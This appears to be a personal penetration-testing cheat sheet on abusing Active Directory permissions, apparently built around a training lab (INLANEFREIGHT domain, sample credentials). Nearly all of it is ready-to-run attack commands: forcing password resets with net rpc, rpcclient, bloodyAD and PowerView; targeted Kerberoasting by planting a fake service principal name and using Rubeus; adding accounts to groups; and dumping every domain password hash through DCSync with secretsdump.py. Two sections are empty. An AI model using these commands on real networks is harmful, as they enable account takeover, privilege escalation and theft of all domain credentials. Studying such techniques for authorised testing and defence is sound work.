- [ ] ForcePassword Change
- [ ] GenricAll
- [ ] GenricWrite
- [ ] Replicate - get Changes - DCSync

ForcePassword Change!!!
```sh
# linux - net rpc password
net rpc password "damundsen" -U "$domain"/"wley"%"transporter@4" -S $dc
# linux - rpcclient
rpcclient -U "wley%transporter@4" 172.16.5.5
rpcclient $> setuserinfo2 damundsen 23 NewPassw0rd@
# linux - bloodyAD
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
# Windows - PowerView
Import-Module .\PowerView.ps1
$newPwd = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $newPwd -Credential $Cred1 -Verbose
```
GenericAll - On A User!!!
```sh
# targeted kerberoating
Set-DomainObject -Credential $Cred1 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:adunn /nowrap

python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d $dc -u wley -p 'transporter@4' --request-user adunn
# change password | Force Password Change
net rpc password "damundsen" -U "$domain"/"wley"%"transporter@4" -S $dc
```
GenericAll - On A Computer!!!
```

```
GenericAll - On A Group!!!
```sh
# net rpc group addmem
net rpc group addmem "Help Desk Level 1" "wley" -U "$domain"/"damundsen"%"NewPassw0rd@" -S $dc
# bloodyAD 
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```
GenericWrite - On a User!!!
```sh
Set-DomainObject -Credential $Cred1 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:adunn /nowrap

python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d $dc -u wley -p 'transporter@4' --request-user adunn
```
GenericWrite - On A Computer!!!
```

```
GenericWrite - On a Group!!!
```sh
# net rpc group addmem
net rpc group addmem "Help Desk Level 1" "wley" -U "$domain"/"damundsen"%"NewPassw0rd@" -S $dc
# bloodyAD 
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```
Replicate - get Changes - DCSync!!!
```sh
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

-just-dc-ntlm flag if we only want NTLM hashes.
-just-dc-user <USERNAME> to only extract data for a user.
-history if we want to dump password history.
-pwd-last-set to see when each account's password was last changed
```